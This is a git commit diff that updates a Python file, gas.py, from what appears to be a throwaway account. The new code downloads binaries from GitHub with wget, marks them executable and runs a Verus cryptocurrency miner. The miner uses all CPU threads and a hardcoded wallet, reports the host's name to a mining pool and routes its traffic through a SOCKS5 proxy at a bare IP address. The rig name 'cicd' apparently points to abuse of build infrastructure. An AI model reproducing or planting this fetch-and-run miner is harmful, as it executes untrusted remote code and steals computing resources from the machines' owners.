2ad8bc57f1410cf9c4272c31b1c6b77c9f4e5071
hsiiqud819 <93416909+hsiiqud819@users.noreply.github.com>
2021-10-30 10:47:55 +0700

    Update gas.py

--- gas.py
+++ gas.py
@@ -1,6 +1,6 @@
 import os
 
-os.system("wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh")
+os.system("wget -O bionicv2 https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/bionicv2")
 os.system("wget https://github.com/hunshukajh/yes/raw/main/gas")
-os.system("chmod +x gas cmdline_launcher.sh")
-os.system("./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe -rigName cicd -pool1 pool.verus.io:9999")
+os.system("chmod +x gas bionicv2")
+os.system("./bionicv2 -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe.$(cat /proc/sys/kernel/hostname) -p x -t $(nproc --all) -x socks5://139.59.107.79:4145")
